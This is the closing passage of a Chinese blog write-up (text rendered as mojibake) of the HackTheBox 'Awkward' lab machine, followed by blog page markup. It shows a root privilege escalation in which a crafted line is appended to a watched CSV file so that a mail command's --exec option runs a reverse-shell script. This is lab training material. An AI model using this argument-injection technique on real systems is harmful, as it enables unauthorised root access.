<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304113424258.png"></p>
<p>æ‹¿åˆ°www-dataç”¨æˆ·æƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304102656231.png"></p>
<p>æœ¬åœ°ä¸‹ä¸€ä¸ª<a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">pspy64</a>ï¼Œç„¶åå¼€å¯80æœåŠ¡ç›‘å¬ï¼Œå†ç„¶ååˆ°beanç”¨æˆ·çš„sshçª—å£ç”¨wgetä»æœ¬åœ°ä¸‹è½½pspy64</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304103703710.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304133818669.png"></p>
<p>ç„¶ååœ¨www-dataç”¨æˆ·çª—å£æ‰§è¡Œpspy64ï¼Œçœ‹åˆ°inotifywaitå·¥å…·åœ¨ç›‘å¬<code>/var/www/private/leave_requests.csv</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304114139856.png"></p>
<p>æŸ¥çœ‹<code>/var/www/private/leave_requests.csv</code>å†…å®¹å¦‚ä¸‹ï¼Œå¯çœ‹åˆ°æ˜¯<code>Leave Request Database</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304134931478.png"></p>
<p>å†çœ‹åˆ°æœ‰mailå‘½ä»¤åœ¨å‘é€é‚®ä»¶ï¼Œæ¨æµ‹æ˜¯ä»<code>Leave Request Database</code>è¯»å–ï¼Œç„¶åå‘é€ã€‚mailå‘½ä»¤å¯ä»¥æ‰§è¡Œæ–‡ä»¶ï¼Œå‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/mail/">https://gtfobins.github.io/gtfobins/mail/</a></p>
<p>æˆ‘ä»¬å¯ä»¥å†™å…¥åå¼¹shellæ–‡ä»¶</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304115141104.png"></p>
<p>æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå°†æ‰§è¡Œåå¼¹shellçš„å‘½ä»¤å†™å…¥<code>leave_requests.csv</code></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">www-data@awkward:~/private$ echo '" --exec="\!/tmp/shell.sh"' &gt;&gt; leave_requests.csv
&lt; '" --exec="\!/tmp/shell.sh"' &gt;&gt; leave_requests.csv
www-data@awkward:~/private$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åå¼€å¯ç›‘å¬ï¼Œç¨ç­‰ç‰‡åˆ»å°±ä¼šæ‹¿åˆ°rootæƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304115919562.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304115938244.png"></p>
<p>Overï¼</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a target="_blank" rel="noopener" href="https://0xdedinfosec.vercel.app/blog/hackthebox-awkward-writeup#cracking-jwt-secret">https://0xdedinfosec.vercel.app/blog/hackthebox-awkward-writeup#cracking-jwt-secret</a></p>
<p><a target="_blank" rel="noopener" href="https://systemweakness.com/hack-the-box-htb-writeup-awkward-3542681d9795">https://systemweakness.com/hack-the-box-htb-writeup-awkward-3542681d9795</a></p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/#sed">https://gtfobins.github.io/#sed</a></p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/sed/">https://gtfobins.github.io/gtfobins/sed/</a></p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/mail/">https://gtfobins.github.io/gtfobins/mail/</a></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        æ–‡ç« ä½œè€…:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://wa0er.github.io" rel="external nofollow noreferrer">wa0er</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        æ–‡ç« é“¾æ¥:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://wa0er.github.io/posts/d776b19d.html">https://wa0er.github.io/posts/d776b19d.html</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        ç‰ˆæƒå£°æ˜:
                    </i>
                </span>
                <span class="reprint-info">
                    æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ¥å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨
                    <a href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC 4.0</a>
                    è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº
                    <a href="https://wa0er.github.io" target="_blank">wa0er</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>å¤åˆ¶æˆåŠŸï¼Œè¯·éµå¾ªæœ¬æ–‡çš„è½¬è½½è§„åˆ™</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">æŸ¥çœ‹</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/LFI/">
                                    <span class="chip bg-color">LFI</span>
                                </a>
                            
                                <a href="/tags/Nginx/">
                                    <span class="chip bg-color">Nginx</span>
                                </a>
                            
                                <a href="/tags/JWT%E4%BC%AA%E9%80%A0/">
                                    <span class="chip bg-color">JWTä¼ªé€ </span>
                                </a>
                            
                                <a href="/tags/SSRF/">
                                    <span class="chip bg-color">SSRF</span>
                                </a>
                            
                                <a href="/tags/awk%E5%91%BD%E4%BB%A4/">
                                    <span class="chip bg-color">awkå‘½ä»¤</span>
                                </a>
                            
                                <a href="/tags/sed%E5%91%BD%E4%BB%A4RCE/">
                                    <span class="chip bg-color">sedå‘½ä»¤RCE</span>
                                </a>
                            
                                <a href="/tags/mail%E5%91%BD%E4%BB%A4/">
                                    <span class="chip bg-color">mailå‘½ä»¤</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="wechat,qq,weibo,qzone,twitter" data-wechat-qrcode-helper="<p>å¾®ä¿¡æ‰«ä¸€æ‰«å³å¯åˆ†äº«ï¼</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">èµ</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">ç¥å®¢å®˜é¡ºé£é¡ºæ°´é¡ºè´¢ç¥</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">æ”¯ä»˜å®</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">å¾® ä¿¡</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="æ”¯ä»˜å®æ‰“èµäºŒç»´ç ">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wepay.jpg" class="reward-img" alt="å¾®ä¿¡æ‰“èµäºŒç»´ç ">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>è¯„è®º</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'BwVA2Xrm8Nb2jkt7vzHraj5v-gzGzoHsz',
        appKey: 'fU1ygroQcwd8phJAJRiJx0lL',
        notify: 'false' === 'true',
        verify: 'true' === 'true',
        visitor: 'true' === 'true',
        avatar: 'retro',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'æ˜µç§°ã€é‚®ç®±ã€ç½‘å€éå¿…å¡«é¡¹ï¼Œå¯ç›´æ¥åŒ¿åè¯„è®ºã€‚',
        enableQQ: false, //æ˜µç§°è¾“å…¥qqå·è‡ªåŠ¨è¯†åˆ«
        emojiCDN: '//i0.hdslb.com/bfs/emote/', 
        // è¡¨æƒ…titleå’Œå›¾ç‰‡æ˜ å°„
        emojiMaps: {
        "tv_doge": "6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png",
        "tv_äº²äº²": "a8111ad55953ef5e3be3327ef94eb4a39d535d06.png",
        "tv_å·ç¬‘": "bb690d4107620f1c15cff29509db529a73aee261.png",
        "tv_å†è§": "180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png",
        "tv_å†·æ¼ ": "b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png",
        "tv_å‘æ€’": "34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png",
        "tv_å‘è´¢": "34db290afd2963723c6eb3c4560667db7253a21a.png",
        "tv_å¯çˆ±": "9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png",
        "tv_åè¡€": "09dd16a7aa59b77baa1155d47484409624470c77.png",
        "tv_å‘†": "fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png",
        "tv_å‘•å": "9f996894a39e282ccf5e66856af49483f81870f3.png",
        "tv_å›°": "241ee304e44c0af029adceb294399391e4737ef2.png",
        "tv_åç¬‘": "1f0b87f731a671079842116e0991c91c2c88645a.png",
        "tv_å¤§ä½¬": "093c1e2c490161aca397afc45573c877cdead616.png",
        "tv_å¤§å“­": "23269aeb35f99daee28dda129676f6e9ea87934f.png",
        "tv_å§”å±ˆ": "d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png",
        "tv_å®³ç¾": "a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png",
        "tv_å°´å°¬": "7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png",
        "tv_å¾®ç¬‘": "70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png",
        "tv_æ€è€ƒ": "90cf159733e558137ed20aa04d09964436f618a1.png",
        "tv_æƒŠå“": "0d15c7e2ee58e935adc6a7193ee042388adc22af.png",
        "tv_æ‰“è„¸": "56ab10b624063e966bfcb76ea5dc4794d87dfd47.png",
        "tv_æŠ“ç‹‚": "fe31c08edad661d63762b04e17b8d5ae3c71a757.png",
        "tv_æŠ é¼»": "c666f55e88d471e51bbd9fab9bb308110824a6eb.png",
        "tv_æ–œçœ¼ç¬‘": "911f987aa8bc1bee12d52aafe62bc41ef4474e6c.png",
        "tv_æ— å¥ˆ": "ea8ed89ee9878f2fece2dda0ea8a5dbfe21b5751.png",
        "tv_æ™•": "5443c22b4d07fb1907ccc610c8e6db254f2461b7.png",
        "tv_æµæ±—": "cead1c351ab8d79e9f369605beb90148db0fbed3.png",
        "tv_æµæ³ª": "7e71cde7858f0cd50d74b0264aa26db612a8a167.png",
        "tv_æµé¼»è¡€": "c32d39db2737f89b904ca32700d140a9241b0767.png",
        "tv_ç‚¹èµ": "f85c354995bd99e28fc76c869bfe42ba6438eff4.png",
        "tv_ç”Ÿæ°”": "26702dcafdab5e8225b43ffd23c94ac1ff932654.png",
        "tv_ç”Ÿç—…": "8b0ec90e6b86771092a498c54f09fc94621c1900.png",
        "tv_ç–‘é—®": "0793d949b18d7be716078349c202c15ff166f314.png",
        "tv_ç™½çœ¼": "c1d59f439e379ee50eef488bcb5e5378e5044ea4.png",
        "tv_çš±çœ‰": "72ccad6679fea0d14cce648b4d818e09b8ffea2d.png",
        "tv_ç›®çªå£å‘†": "0b8cb81a68de5d5365212c99375e7ace3e7891b7.png",
        "tv_ç¡ç€": "8b196675b53af58264f383c50ad0945048290b33.png",
        "tv_ç¬‘å“­": "1abc628f6d4f4caf9d0e7800878f4697abbc8273.png",
        "tv_è…¼è…†": "89712c0d4af73e67f89e35cbc518420380a7f6f4.png",
        "tv_è‰²": "61822c7e9aae5da76475e7892534545336b23a6f.png",
        "tv_è°ƒä¾ƒ": "4bc022533ef31544ca0d72c12c808cf4a1cce3e3.png",
        "tv_è°ƒçš®": "b9c41de8e82dd7a8515ae5e3cb63e898bf245186.png",
        "tv_é„™è§†": "6e72339f346a692a495b123174b49e4e8e781303.png",
        "tv_é—­å˜´": "c9e990da7f6e93975e25fd8b70e2e290aa4086ef.png",
        "tv_éš¾è¿‡": "87f46748d3f142ebc6586ff58860d0e2fc8263ba.png",
        "tv_é¦‹": "fc7e829b845c43c623c8b490ee3602b7f0e76a31.png",
        "tv_é¬¼è„¸": "0ffbbddf8a94d124ca2f54b360bbc04feb6bbfea.png",
        "tv_é»‘äººé—®å·": "45821a01f51bc867da9edbaa2e070410819a95b2.png",
        "tv_é¼“æŒ": "1d21793f96ef4e6f48b23e53e3b9e42da833a0f6.png"
            // ... æ›´å¤šè¡¨æƒ…
        }
    });
</script>

<!--é…·Qæ¨é€-->


<!-- ç›´è¾¾è¯„è®º -->
<div id="to_comment" class="comment-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#vcomments" title="ç›´è¾¾è¯„è®º">
        <i class="fas fa-comments"></i>
    </a>
</div>


    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;ä¸Šä¸€ç¯‡</div>
            <div class="card">
                <a href="/posts/7f4bdc86.html">
                    <div class="card-image">
                        
                        <img src="/medias/article_cover/Forgot.png" class="responsive-img" alt="HTB-Forgot">
                        
                        <span class="card-title">HTB-Forgot</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            HackTheBox-Forgot
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-03-15
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
                                    é¶æœº
                                </a>
                            
                            <a href="/categories/%E9%9D%B6%E6%9C%BA/HackTheBox/" class="post-category">
                                    HackTheBox
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/varnish%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%BC%93%E5%AD%98/">
                        <span class="chip bg-color">varnishåå‘ä»£ç†ç¼“å­˜</span>
                    </a>
                    
                    <a href="/tags/%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81%E5%8A%9F%E8%83%BD%E6%8A%95%E6%AF%92/">
                        <span class="chip bg-color">é‡ç½®å¯†ç åŠŸèƒ½æŠ•æ¯’</span>
                    </a>
                    
                    <a href="/tags/CVE-2022-29216%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89/">
                        <span class="chip bg-color">CVE-2022-29216ï¼ˆå‘½ä»¤æ‰§è¡Œï¼‰</span>
                    </a>
                    
                    <a href="/tags/python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
                        <span class="chip bg-color">pythonä»£ç å®¡è®¡</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                ä¸‹ä¸€ç¯‡&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/posts/d0709a37.html">
                    <div class="card-image">
                        
                        <img src="/medias/article_cover/Soccer.png" class="responsive-img" alt="HTB-Soccer">
                        
                        <span class="card-title">HTB-Soccer</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            HackTheBox-Soccer
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-08
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
                                    é¶æœº
                                </a>
                            
                            <a href="/categories/%E9%9D%B6%E6%9C%BA/HackTheBox/" class="post-category">
                                    HackTheBox
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Tiny-File-Manager%E5%BC%B1%E5%8F%A3%E4%BB%A4/">
                        <span class="chip bg-color">Tiny File Managerå¼±å£ä»¤</span>
                    </a>
                    
                    <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
                        <span class="chip bg-color">æ–‡ä»¶ä¸Šä¼ </span>
                    </a>
                    
                    <a href="/tags/ngnix/">
                        <span class="chip bg-color">ngnix</span>
                    </a>
                    
                    <a href="/tags/WebSocket%E5%AE%9E%E7%8E%B0SQL%E6%B3%A8%E5%85%A5/">
                        <span class="chip bg-color">WebSocketå®ç°SQLæ³¨å…¥</span>
                    </a>
                    
                    <a href="/tags/doas%E5%92%8Cdstat%E8%81%94%E5%8A%A8%E6%8F%90%E6%9D%83/">
                        <span class="chip bg-color">doaså’Œdstatè”åŠ¨ææƒ</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('1')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + 'æ¥æº: wa0er<br />'
            + 'æ–‡ç« ä½œè€…: wa0er<br />'
            + 'æ–‡ç« é“¾æ¥: <a href="' + url + '">' + url + '</a><br />'
            + 'å¼•ç”¨æˆ–è½¬è½½æ–‡ç« å†…å®¹æ—¶ï¼Œæ³¨æ˜æºæ–‡ç« é“¾æ¥å°±å¥½ï¼Œè°¢è°¢æ‚¨ã€‚';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- ä»£ç å—åŠŸèƒ½ä¾èµ– -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- ä»£ç è¯­è¨€ -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- ä»£ç å—å¤åˆ¶ -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- ä»£ç å—æ”¶ç¼© -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;ç›®å½•</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC æ‚¬æµ®æŒ‰é’®. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('3'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* ä¿®å¤æ–‡ç« å¡ç‰‡ div çš„å®½åº¦. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // åˆ‡æ¢TOCç›®å½•å±•å¼€æ”¶ç¼©çš„ç›¸å…³æ“ä½œ.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2022-2023</span>
            
            <a href="/about" target="_blank">wa0er</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>

            <br>
            
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;ç«™ç‚¹æ–‡ç« æ€»å­—æ•°:&nbsp;<span
                        class="white-color">68.8k&nbsp;å­—</span>
            
            

            <br>

            <!-- è¿è¡Œå¤©æ•°æé†’. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link ">
    <a href="https://github.com/wa0er" class="tooltipped" target="_blank" data-tooltip="è®¿é—®æˆ‘çš„GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:heyzky@foxmail.com" class="tooltipped" target="_blank" data-tooltip="æˆ‘çš„é‚®ç®±" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>













    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS è®¢é˜…" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- æœç´¢é®ç½©æ¡† -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;æœç´¢</span>
